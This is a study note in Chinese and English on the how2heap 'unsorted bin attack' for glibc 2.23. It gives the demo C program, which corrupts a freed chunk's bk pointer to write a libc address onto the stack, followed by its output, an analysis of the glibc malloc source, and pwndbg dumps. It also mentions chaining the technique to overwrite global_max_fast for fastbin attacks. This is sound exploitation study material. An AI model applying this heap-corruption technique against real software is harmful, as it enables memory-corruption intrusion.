# unsorted_bin_attack

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
	fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
		   "global variable global_max_fast in libc for further fastbin attack\n\n");

	unsigned long stack_var=0;
	fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
	fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);

	unsigned long *p=malloc(400);
	fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
	fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
	malloc(500);

	free(p);
	fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
		   "point to %p\n",(void*)p[1]);

	//------------VULNERABILITY-----------

	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
	fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

	//------------------------------------

	malloc(400);
	fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
		   "rewritten:\n");
	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
}
```

**result**

```c
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the target we want to rewrite on stack:
0x7fff1d26a9d8: 0

Now, we allocate first normal chunk on the heap at: 0x21e0010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1cfe021b78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fff1d26a9c8

Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten:
0x7fff1d26a9d8: 0x7f1cfe021b78
```

**analysis**

首先，申请一个chunk，p，之后再申请一个chunk防止与top chunk的合并。free(p)，p就被加入到unsorted bin中。

接着，我们又将p的bk指针指向&stack_var-0x10。再次将p申请回来，重点看这面这段代码

```c
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
          size = chunksize (victim);

          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
           */

          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */
			...
            }

          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

unsorted bin不为空，while循环的条件成立。由于我们修改了bk指针，其不再指向unsorted bin头，if条件不成立。所以将p从unsorted bin中取出来，unsorted bin的bk指向了栈上的fake chunk，fake chunk的fd被写入了unsorted bin头的地址，这样我们就将libc写入栈上。

这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。**而且，需要注意的是，**

这看起来似乎并没有什么用处，但是其实还是有点卵用的，比如说

- 我们通过修改循环的次数来使得程序可以执行多次循环。
- 我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。

**gdb**

free(p)

```c
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
smallbins
empty
largebins
empty
```

修改bk指针

```c
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
BK: 0x602000 —▸ 0x7fffffffdc78 —▸ 0x602010 ◂— 0x0
smallbins
empty
largebins
empty
```

栈上的数据

```c
pwndbg> x/16 0x7fffffffdc78
0x7fffffffdc78:	4196343	0	4196496	0
0x7fffffffdc88:	0	0	6299664	0
0x7fffffffdc98:	1919562240	-1906853033	4196496	0
0x7fffffffdca8:	-140322752	32767	1	0
```

malloc(400)

```c
pwndbg> stack 10
00:0000│ rsp  0x7fffffffdc80 —▸ 0x400890 (__libc_csu_init) ◂— push   r15
01:0008│      0x7fffffffdc88 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x6023a0 ◂— 0x0
02:0010│      0x7fffffffdc90 —▸ 0x602010 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x6023a0 ◂— 0x0
03:0018│      0x7fffffffdc98 ◂— 0x8e57bb57726a3200
04:0020│ rbp  0x7fffffffdca0 —▸ 0x400890 (__libc_csu_init) ◂— push   r15
05:0028│      0x7fffffffdca8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
06:0030│      0x7fffffffdcb0 ◂— 0x1
07:0038│      0x7fffffffdcb8 —▸ 0x7fffffffdd88 —▸ 0x7fffffffe132 ◂— '/home/niebelungen/Desktop/how2heap/how2heap/glibc_2.23/unsorted_bin_attack'
08:0040│      0x7fffffffdcc0 ◂— 0x1f7ffcca0
09:0048│      0x7fffffffdcc8 —▸ 0x4006a6 (main) ◂— push   rbp
```

